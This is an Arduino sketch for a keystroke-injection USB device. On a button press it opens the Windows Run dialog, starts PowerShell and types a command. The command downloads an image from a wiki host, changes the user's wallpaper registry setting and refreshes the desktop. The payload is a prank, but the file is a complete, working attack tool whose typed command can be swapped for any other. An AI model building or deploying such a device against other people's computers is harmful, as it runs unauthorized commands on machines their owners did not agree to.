#include "HID-Project.h"

const int pinLed = 9;
const int pinButton_front = 7;
const int pinButton_back = 8;

void setup() {
  // setup pins
  pinMode(pinLed, OUTPUT);
  pinMode(pinButton_front, INPUT_PULLUP);
  pinMode(pinButton_back, INPUT_PULLUP);

  // Initialize keyboard
  Keyboard.begin();

}

void loop() {
  // put your main code here, to run repeatedly:
  if (!digitalRead(pinButton_front)) {
    digitalWrite(pinLed, HIGH);

    delay(1000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();

    delay(100);

    Keyboard.println("powershell");

    delay(5000);

    Keyboard.println("Invoke-WebRequest -OutFile \"C:/Users/Public/out.png\" \"http://vignette.wikia.nocookie.net/jaygt/images/e/ee/Ricardomilos.png\"; Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value \"C:\\Users\\Public\\out.png\"; rundll32.exe user32.dll, UpdatePerUserSystemParameters; rundll32.exe user32.dll, UpdatePerUserSystemParameters; exit");

    // Ending stream
    Keyboard.end();

    while (1) {
      digitalWrite(pinLed, LOW);
      delay(500);
      digitalWrite(pinLed, HIGH);
      delay(500);
    }
  }
}
